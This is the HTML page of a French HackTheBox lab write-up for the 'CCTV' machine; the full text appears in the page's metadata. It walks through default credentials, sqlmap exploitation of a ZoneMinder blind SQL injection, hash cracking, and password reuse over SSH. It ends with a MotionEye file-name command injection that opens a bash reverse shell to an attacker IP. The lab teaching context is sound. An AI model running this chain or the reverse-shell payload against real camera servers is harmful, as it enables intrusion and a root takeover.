@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CCTV - HackTheBox Writeup | keyll0ger</title>
+<meta name="keywords" content="HTB, Linux, Easy, SQLi">
+<meta name="description" content="OS: Ubuntu 24.04 | Difficulté: Easy | IP: 10.129.15.181
+Phase 1 - Reconnaissance Scan de ports nmap -Pn -p- --min-rate 5000 10.129.15.181 nmap -Pn -sCV -p 22,80 10.129.15.181 Résultats :
+Port Service Info 22 SSH OpenSSH 9.6p1 Ubuntu 80 HTTP Apache 2.4.58, redirect → http://cctv.htb/ Réflexion : Seulement 2 ports. Le redirect vers cctv.htb indique un virtual host. On ajoute au /etc/hosts.
+echo &#39;10.129.15.181 cctv.htb&#39; | sudo tee -a /etc/hosts Phase 2 - Enumération Web Page d&rsquo;accueil curl -s http://cctv.">
+<meta name="author" content="keyll0ger">
+<link rel="canonical" href="https://keyll0ger.github.io/posts/cctv/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://keyll0ger.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://keyll0ger.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://keyll0ger.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://keyll0ger.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://keyll0ger.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://keyll0ger.github.io/posts/cctv/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:title" content="CCTV - HackTheBox Writeup" />
+<meta property="og:description" content="OS: Ubuntu 24.04 | Difficulté: Easy | IP: 10.129.15.181
+Phase 1 - Reconnaissance Scan de ports nmap -Pn -p- --min-rate 5000 10.129.15.181 nmap -Pn -sCV -p 22,80 10.129.15.181 Résultats :
+Port Service Info 22 SSH OpenSSH 9.6p1 Ubuntu 80 HTTP Apache 2.4.58, redirect → http://cctv.htb/ Réflexion : Seulement 2 ports. Le redirect vers cctv.htb indique un virtual host. On ajoute au /etc/hosts.
+echo &#39;10.129.15.181 cctv.htb&#39; | sudo tee -a /etc/hosts Phase 2 - Enumération Web Page d&rsquo;accueil curl -s http://cctv." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://keyll0ger.github.io/posts/cctv/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2026-03-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2026-03-27T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CCTV - HackTheBox Writeup"/>
+<meta name="twitter:description" content="OS: Ubuntu 24.04 | Difficulté: Easy | IP: 10.129.15.181
+Phase 1 - Reconnaissance Scan de ports nmap -Pn -p- --min-rate 5000 10.129.15.181 nmap -Pn -sCV -p 22,80 10.129.15.181 Résultats :
+Port Service Info 22 SSH OpenSSH 9.6p1 Ubuntu 80 HTTP Apache 2.4.58, redirect → http://cctv.htb/ Réflexion : Seulement 2 ports. Le redirect vers cctv.htb indique un virtual host. On ajoute au /etc/hosts.
+echo &#39;10.129.15.181 cctv.htb&#39; | sudo tee -a /etc/hosts Phase 2 - Enumération Web Page d&rsquo;accueil curl -s http://cctv."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://keyll0ger.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CCTV - HackTheBox Writeup",
+      "item": "https://keyll0ger.github.io/posts/cctv/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CCTV - HackTheBox Writeup",
+  "name": "CCTV - HackTheBox Writeup",
+  "description": "OS: Ubuntu 24.04 | Difficulté: Easy | IP: 10.129.15.181\nPhase 1 - Reconnaissance Scan de ports nmap -Pn -p- --min-rate 5000 10.129.15.181 nmap -Pn -sCV -p 22,80 10.129.15.181 Résultats :\nPort Service Info 22 SSH OpenSSH 9.6p1 Ubuntu 80 HTTP Apache 2.4.58, redirect → http://cctv.htb/ Réflexion : Seulement 2 ports. Le redirect vers cctv.htb indique un virtual host. On ajoute au /etc/hosts.\necho \u0026#39;10.129.15.181 cctv.htb\u0026#39; | sudo tee -a /etc/hosts Phase 2 - Enumération Web Page d\u0026rsquo;accueil curl -s http://cctv.",
+  "keywords": [
+    "HTB", "Linux", "Easy", "SQLi"
+  ],
+  "articleBody": " OS: Ubuntu 24.04 | Difficulté: Easy | IP: 10.129.15.181\nPhase 1 - Reconnaissance Scan de ports nmap -Pn -p- --min-rate 5000 10.129.15.181 nmap -Pn -sCV -p 22,80 10.129.15.181 Résultats :\nPort Service Info 22 SSH OpenSSH 9.6p1 Ubuntu 80 HTTP Apache 2.4.58, redirect → http://cctv.htb/ Réflexion : Seulement 2 ports. Le redirect vers cctv.htb indique un virtual host. On ajoute au /etc/hosts.\necho '10.129.15.181 cctv.htb' | sudo tee -a /etc/hosts Phase 2 - Enumération Web Page d’accueil curl -s http://cctv.htb/ Site “SecureVision CCTV \u0026 Security Solutions”. Un lien “Staff Login” pointe vers /zm.\nZoneMinder curl -s http://cctv.htb/zm/ | head -20 ZoneMinder - logiciel open-source de vidéosurveillance. Page de login classique.\nPourquoi chercher des CVE ? Le header X-Powered-By ou le code source révèle la version. On identifie ZoneMinder 1.37.63. En cherchant “ZoneMinder CVE”, on trouve CVE-2024-51482 - Blind SQL Injection dans le paramètre tid de l’endpoint removetag.\nTest de la vulnérabilité L’endpoint vulnérable nécessite une authentification. On teste d’abord les credentials par défaut :\nadmin:admin → succès ! # Capture d'une requête authentifiée dans un fichier cat \u003e req.txt \u003c\u003c 'EOF' GET /zm/index.php?view=request\u0026request=event\u0026action=removetag\u0026tid=1 HTTP/1.1 Host: cctv.htb User-Agent: Mozilla/5.0 Cookie: zmSkin=classic; zmCSS=base; ZMSESSID= Connection: close EOF # SQLMap sqlmap -r req.txt -p tid --batch --technique=T --dbs sqlmap -r req.txt -p tid --batch --technique=T -D zm --tables sqlmap -r req.txt -p tid --batch --technique=T --dump -D zm -T Users Users extraits Username Password (bcrypt) superadmin $2y$10$cmytVWFRnt1XfqsItsJRVe/... mark $2y$10$prZGnazejKcuTv5bKNexXO... admin $2y$10$t5z8uIT.n9uCdHCNidcLf.... Crack des hashes hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt --force Résultats :\nUser Password mark opensesame superadmin admin admin admin Phase 3 - Accès SSH (User mark) Pourquoi tester mark en SSH ? Un user applicatif (ZoneMinder) avec un vrai nom (mark) a de fortes chances d’être aussi un user système. Password reuse = réflexe.\nssh mark@cctv.htb # password: opensesame Connecté ! Mais mark n’a pas de user.txt dans son home. Le flag est dans /home/sa_mark/ (accès refusé).\nEnumération locale id # uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev) cat /etc/passwd | grep sh$ # mark:x:1000:1000:mark:/home/mark:/bin/bash # root:x:0:0:root:/root:/bin/bash # sa_mark:x:1001:1001::/home/sa_mark:/bin/sh sudo -l # Sorry, user mark may not run sudo on cctv Services locaux ss -tlnp Port Service 3306 MySQL 7999 Motion webcontrol 8554 MediaMTX RTSP 8765 MotionEye 8888 MediaMTX API 9081 Motion stream Pourquoi MotionEye est intéressant ? MotionEye tourne en root (nécessaire pour accéder aux caméras). Si on peut y accéder en admin, on peut potentiellement exécuter des commandes en tant que root.\nConfig MotionEye cat /etc/motioneye/motion.conf # @admin_username admin # @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0 Le password admin est stocké en SHA1. Il n’a pas été cracké avec rockyou, mais on peut l’utiliser directement pour se connecter à l’interface web.\nPhase 4 - MotionEye → Root SSH Tunnel Pourquoi un tunnel ? MotionEye écoute sur 127.0.0.1:8765 - pas accessible depuis l’extérieur. On crée un tunnel SSH pour l’atteindre via notre navigateur.\nssh -L 8765:127.0.0.1:8765 mark@cctv.htb Puis ouvrir http://localhost:8765 dans le navigateur.\nLogin MotionEye Username : admin Password : 989c5a8ee87a0e9521ec81a79187d162109282f0 (le hash SHA1 tel quel) Pourquoi le hash fonctionne comme password ? MotionEye compare le SHA1 de l’input avec le hash stocké, OU compare l’input directement avec le hash stocké. Donc entrer le hash lui-même passe la vérification.\nRCE via Client-Side Validation Bypass MotionEye 0.43.1b4 a une vulnérabilité : les champs de configuration ne sont pas sanitisés côté serveur. La validation n’existe que côté client (JavaScript). En bypassant cette validation, on peut injecter des commandes shell.\nÉtape 1 : Bypass la validation JavaScript\nOuvrir la console du navigateur (F12 → Console) :\nconfigUiValid = function() { return true; }; Pourquoi ça marche ? La fonction configUiValid() vérifie les inputs avant soumission. En la remplaçant par une fonction qui retourne toujours true, on court-circuite toute la validation.\nÉtape 2 : Configurer le payload\nDans les settings de la caméra :\nStill Images → Capture Mode = Interval Snapshots Snapshot Interval = 10 secondes Image File Name : $(python3 -c \"import os;os.system('bash -c \\\"bash -i \u003e\u0026 /dev/tcp/10.10.17.198/9001 0\u003e\u00261\\\"')\").%Y-%m-%d-%H-%M-%S Cliquer Apply Pourquoi ça donne un RCE ? MotionEye écrit ce nom de fichier directement dans le fichier de config Motion (camera-1.conf) comme picture_filename. Quand Motion exécute et génère un snapshot, il interprète $(...) comme une commande shell et l’exécute. Motion tourne sous MotionEye qui tourne en root.\nÉtape 3 : Listener\nnc -lvnp 9001 Le reverse shell root arrive dans les 10 secondes.\nFlags cat /home/sa_mark/user.txt # 9f9e80807884a26893c1bbf6483f2c16 cat /root/root.txt # 2ca10afb1e68e0dc6ecd8995ce5e9c18 Kill Chain Visuel ┌─────────────────────────────────┐ │ Nmap → SSH + HTTP (Apache) │ │ cctv.htb → ZoneMinder 1.37.63│ └────────────────┬────────────────┘ │ admin:admin (default) ┌────────────────▼────────────────┐ │ CVE-2024-51482 Blind SQLi │ │ sqlmap -r req.txt -p tid │ │ Dump Users table → bcrypt │ └────────────────┬────────────────┘ │ hashcat → mark:opensesame ┌────────────────▼────────────────┐ │ SSH mark@cctv.htb │ │ Enum → MotionEye 0.43.1b4 │ │ sur 127.0.0.1:8765 (root) │ └────────────────┬────────────────┘ │ ssh -L 8765:127.0.0.1:8765 ┌────────────────▼────────────────┐ │ MotionEye Admin │ │ Login: admin / SHA1_hash │ │ Console: configUiValid=true │ │ Image File Name injection │ │ $(reverse_shell).%Y-%m-%d... │ └────────────────┬────────────────┘ │ MotionEye runs as ROOT ┌────────────────▼────────────────┐ │ ROOT SHELL │ │ user.txt + root.txt │ └─────────────────────────────────┘ Scripts Custom exploit_cve2024_51482.py Script Blind SQLi pour ZoneMinder - voir /opt/CTF/Machines/CCTV/exploit_cve2024_51482.py\nUtilisation :\n# Test vulnérabilité python3 exploit_cve2024_51482.py -i cctv.htb -u admin -p admin --test # Dump users python3 exploit_cve2024_51482.py -i cctv.htb -u admin -p admin --users # Découvrir les databases python3 exploit_cve2024_51482.py -i cctv.htb -u admin -p admin --discover Note : sqlmap avec un fichier de requête est plus rapide et fiable pour cette CVE.\nCredentials récupérées User Password Source admin (ZM) admin Default / Hashcat superadmin (ZM) admin Hashcat mark (ZM/SSH) opensesame Hashcat bcrypt zmuser (MySQL) zmpass ZM API config admin (MotionEye) SHA1: 989c5a8ee87a0e9521ec81a79187d162109282f0 Config file Leçons apprises Credentials par défaut → admin:admin sur ZoneMinder. Toujours tester avant de chercher des exploits.\nCVE spécifiques à la version → ZoneMinder 1.37.63 est vulnérable à CVE-2024-51482 (Blind SQLi). Chercher les advisories GitHub pour la version exacte.\nPassword reuse → Le user mark de ZoneMinder est aussi un user SSH avec le même password.\nSSH tunnel pour services locaux → Quand un service écoute sur localhost, ssh -L est la méthode la plus simple pour y accéder. Pas besoin de scripts API complexes.\nClient-side validation bypass → MotionEye 0.43.1b4 ne valide les inputs que côté client. Un configUiValid = function() { return true; } dans la console suffit.\nInjection dans les noms de fichiers → MotionEye écrit les configs Motion directement sans sanitisation. $(commande) dans un nom de fichier = RCE.\nMotionEye tourne en root → C’est un choix de design (accès caméras), mais ça donne root directement quand on a le RCE.\nFlags User: 9f9e80807884a26893c1bbf6483f2c16 Root: 2ca10afb1e68e0dc6ecd8995ce5e9c18 ",
+  "wordCount" : "1086",
+  "inLanguage": "en",
+  "datePublished": "2026-03-27T00:00:00Z",
+  "dateModified": "2026-03-27T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "keyll0ger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://keyll0ger.github.io/posts/cctv/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "keyll0ger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://keyll0ger.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://keyll0ger.github.io/" accesskey="h" title="keyll0ger (Alt + H)">keyll0ger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://keyll0ger.github.io/posts/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://keyll0ger.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://keyll0ger.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      CCTV - HackTheBox Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-03-27 00:00:00 +0000 UTC'>March 27, 2026</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;keyll0ger
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#phase-1---reconnaissance" aria-label="Phase 1 - Reconnaissance">Phase 1 - Reconnaissance</a><ul>
+                        
+                <li>
+                    <a href="#scan-de-ports" aria-label="Scan de ports">Scan de ports</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-2---enum%c3%a9ration-web" aria-label="Phase 2 - Enumération Web">Phase 2 - Enumération Web</a><ul>
+                        
+                <li>
+                    <a href="#page-daccueil" aria-label="Page d&rsquo;accueil">Page d&rsquo;accueil</a></li>
+                <li>
+                    <a href="#zoneminder" aria-label="ZoneMinder">ZoneMinder</a></li>
+                <li>
+                    <a href="#pourquoi-chercher-des-cve-" aria-label="Pourquoi chercher des CVE ?">Pourquoi chercher des CVE ?</a></li>
+                <li>
+                    <a href="#test-de-la-vuln%c3%a9rabilit%c3%a9" aria-label="Test de la vulnérabilité">Test de la vulnérabilité</a></li>
+                <li>
+                    <a href="#users-extraits" aria-label="Users extraits">Users extraits</a></li>
+                <li>
+                    <a href="#crack-des-hashes" aria-label="Crack des hashes">Crack des hashes</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-3---acc%c3%a8s-ssh-user-mark" aria-label="Phase 3 - Accès SSH (User mark)">Phase 3 - Accès SSH (User mark)</a><ul>
+                        
+                <li>
+                    <a href="#pourquoi-tester-mark-en-ssh-" aria-label="Pourquoi tester mark en SSH ?">Pourquoi tester mark en SSH ?</a></li>
+                <li>
+                    <a href="#enum%c3%a9ration-locale" aria-label="Enumération locale">Enumération locale</a></li>
+                <li>
+                    <a href="#services-locaux" aria-label="Services locaux">Services locaux</a></li>
+                <li>
+                    <a href="#pourquoi-motioneye-est-int%c3%a9ressant-" aria-label="Pourquoi MotionEye est intéressant ?">Pourquoi MotionEye est intéressant ?</a></li>
+                <li>
+                    <a href="#config-motioneye" aria-label="Config MotionEye">Config MotionEye</a></li></ul>
+                </li>
+                <li>
+                    <a href="#phase-4---motioneye--root" aria-label="Phase 4 - MotionEye → Root">Phase 4 - MotionEye → Root</a><ul>
+                        
+                <li>
+                    <a href="#ssh-tunnel" aria-label="SSH Tunnel">SSH Tunnel</a></li>
+                <li>
+                    <a href="#login-motioneye" aria-label="Login MotionEye">Login MotionEye</a></li>
+                <li>
+                    <a href="#rce-via-client-side-validation-bypass" aria-label="RCE via Client-Side Validation Bypass">RCE via Client-Side Validation Bypass</a></li>
+                <li>
+                    <a href="#flags" aria-label="Flags">Flags</a></li></ul>
+                </li>
+                <li>
+                    <a href="#kill-chain-visuel" aria-label="Kill Chain Visuel">Kill Chain Visuel</a></li>
+                <li>
+                    <a href="#scripts-custom" aria-label="Scripts Custom">Scripts Custom</a><ul>
+                        
+                <li>
+                    <a href="#exploit_cve2024_51482py" aria-label="exploit_cve2024_51482.py">exploit_cve2024_51482.py</a></li></ul>
+                </li>
+                <li>
+                    <a href="#credentials-r%c3%a9cup%c3%a9r%c3%a9es" aria-label="Credentials récupérées">Credentials récupérées</a></li>
+                <li>
+                    <a href="#le%c3%a7ons-apprises" aria-label="Leçons apprises">Leçons apprises</a></li>
+                <li>
+                    <a href="#flags-1" aria-label="Flags">Flags</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><blockquote>
+<p><strong>OS:</strong> Ubuntu 24.04 | <strong>Difficulté:</strong> Easy | <strong>IP:</strong> 10.129.15.181</p>
+</blockquote>
+<hr>
+<h2 id="phase-1---reconnaissance">Phase 1 - Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#phase-1---reconnaissance">#</a></h2>
+<h3 id="scan-de-ports">Scan de ports<a hidden class="anchor" aria-hidden="true" href="#scan-de-ports">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -Pn -p- --min-rate <span style="color:#ae81ff">5000</span> 10.129.15.181
+</span></span><span style="display:flex;"><span>nmap -Pn -sCV -p 22,80 10.129.15.181
+</span></span></code></pre></div><p><strong>Résultats :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22</td>
+<td>SSH</td>
+<td>OpenSSH 9.6p1 Ubuntu</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td>Apache 2.4.58, redirect → <code>http://cctv.htb/</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Réflexion :</strong> Seulement 2 ports. Le redirect vers <code>cctv.htb</code> indique un virtual host. On ajoute au <code>/etc/hosts</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;10.129.15.181 cctv.htb&#39;</span> | sudo tee -a /etc/hosts
+</span></span></code></pre></div><hr>
+<h2 id="phase-2---enumération-web">Phase 2 - Enumération Web<a hidden class="anchor" aria-hidden="true" href="#phase-2---enumération-web">#</a></h2>
+<h3 id="page-daccueil">Page d&rsquo;accueil<a hidden class="anchor" aria-hidden="true" href="#page-daccueil">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s http://cctv.htb/
+</span></span></code></pre></div><p>Site &ldquo;SecureVision CCTV &amp; Security Solutions&rdquo;. Un lien <strong>&ldquo;Staff Login&rdquo;</strong> pointe vers <code>/zm</code>.</p>
+<h3 id="zoneminder">ZoneMinder<a hidden class="anchor" aria-hidden="true" href="#zoneminder">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s http://cctv.htb/zm/ | head -20
+</span></span></code></pre></div><p><strong>ZoneMinder</strong> - logiciel open-source de vidéosurveillance. Page de login classique.</p>
+<h3 id="pourquoi-chercher-des-cve-">Pourquoi chercher des CVE ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-chercher-des-cve-">#</a></h3>
+<p>Le header <code>X-Powered-By</code> ou le code source révèle la version. On identifie <strong>ZoneMinder 1.37.63</strong>. En cherchant &ldquo;ZoneMinder CVE&rdquo;, on trouve <strong>CVE-2024-51482</strong> - Blind SQL Injection dans le paramètre <code>tid</code> de l&rsquo;endpoint <code>removetag</code>.</p>
+<h3 id="test-de-la-vulnérabilité">Test de la vulnérabilité<a hidden class="anchor" aria-hidden="true" href="#test-de-la-vulnérabilité">#</a></h3>
+<p>L&rsquo;endpoint vulnérable nécessite une authentification. On teste d&rsquo;abord les credentials par défaut :</p>
+<ul>
+<li><code>admin:admin</code> → <strong>succès !</strong></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Capture d&#39;une requête authentifiée dans un fichier</span>
+</span></span><span style="display:flex;"><span>cat &gt; req.txt <span style="color:#e6db74">&lt;&lt; &#39;EOF&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">GET /zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1 HTTP/1.1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Host: cctv.htb
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">User-Agent: Mozilla/5.0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Cookie: zmSkin=classic; zmCSS=base; ZMSESSID=&lt;votre_session&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Connection: close
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># SQLMap</span>
+</span></span><span style="display:flex;"><span>sqlmap -r req.txt -p tid --batch --technique<span style="color:#f92672">=</span>T --dbs
+</span></span><span style="display:flex;"><span>sqlmap -r req.txt -p tid --batch --technique<span style="color:#f92672">=</span>T -D zm --tables
+</span></span><span style="display:flex;"><span>sqlmap -r req.txt -p tid --batch --technique<span style="color:#f92672">=</span>T --dump -D zm -T Users
+</span></span></code></pre></div><h3 id="users-extraits">Users extraits<a hidden class="anchor" aria-hidden="true" href="#users-extraits">#</a></h3>
+<table>
+<thead>
+<tr>
+<th>Username</th>
+<th>Password (bcrypt)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>superadmin</td>
+<td><code>$2y$10$cmytVWFRnt1XfqsItsJRVe/...</code></td>
+</tr>
+<tr>
+<td>mark</td>
+<td><code>$2y$10$prZGnazejKcuTv5bKNexXO...</code></td>
+</tr>
+<tr>
+<td>admin</td>
+<td><code>$2y$10$t5z8uIT.n9uCdHCNidcLf....</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="crack-des-hashes">Crack des hashes<a hidden class="anchor" aria-hidden="true" href="#crack-des-hashes">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">3200</span> hashes.txt /usr/share/wordlists/rockyou.txt --force
+</span></span></code></pre></div><p><strong>Résultats :</strong></p>
+<table>
+<thead>
+<tr>
+<th>User</th>
+<th>Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>mark</td>
+<td><strong>opensesame</strong></td>
+</tr>
+<tr>
+<td>superadmin</td>
+<td>admin</td>
+</tr>
+<tr>
+<td>admin</td>
+<td>admin</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="phase-3---accès-ssh-user-mark">Phase 3 - Accès SSH (User mark)<a hidden class="anchor" aria-hidden="true" href="#phase-3---accès-ssh-user-mark">#</a></h2>
+<h3 id="pourquoi-tester-mark-en-ssh-">Pourquoi tester mark en SSH ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-tester-mark-en-ssh-">#</a></h3>
+<p>Un user applicatif (ZoneMinder) avec un vrai nom (<code>mark</code>) a de fortes chances d&rsquo;être aussi un user système. Password reuse = réflexe.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh mark@cctv.htb
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># password: opensesame</span>
+</span></span></code></pre></div><p><strong>Connecté !</strong> Mais <code>mark</code> n&rsquo;a pas de user.txt dans son home. Le flag est dans <code>/home/sa_mark/</code> (accès refusé).</p>
+<h3 id="enumération-locale">Enumération locale<a hidden class="anchor" aria-hidden="true" href="#enumération-locale">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># uid=1000(mark) gid=1000(mark) groups=1000(mark),24(cdrom),30(dip),46(plugdev)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cat /etc/passwd | grep sh$
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># mark:x:1000:1000:mark:/home/mark:/bin/bash</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># root:x:0:0:root:/root:/bin/bash</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sa_mark:x:1001:1001::/home/sa_mark:/bin/sh</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo -l
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sorry, user mark may not run sudo on cctv</span>
+</span></span></code></pre></div><h3 id="services-locaux">Services locaux<a hidden class="anchor" aria-hidden="true" href="#services-locaux">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ss -tlnp
+</span></span></code></pre></div><table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>3306</td>
+<td>MySQL</td>
+</tr>
+<tr>
+<td>7999</td>
+<td>Motion webcontrol</td>
+</tr>
+<tr>
+<td>8554</td>
+<td>MediaMTX RTSP</td>
+</tr>
+<tr>
+<td>8765</td>
+<td><strong>MotionEye</strong></td>
+</tr>
+<tr>
+<td>8888</td>
+<td>MediaMTX API</td>
+</tr>
+<tr>
+<td>9081</td>
+<td>Motion stream</td>
+</tr>
+</tbody>
+</table>
+<h3 id="pourquoi-motioneye-est-intéressant-">Pourquoi MotionEye est intéressant ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-motioneye-est-intéressant-">#</a></h3>
+<p>MotionEye tourne en <strong>root</strong> (nécessaire pour accéder aux caméras). Si on peut y accéder en admin, on peut potentiellement exécuter des commandes en tant que root.</p>
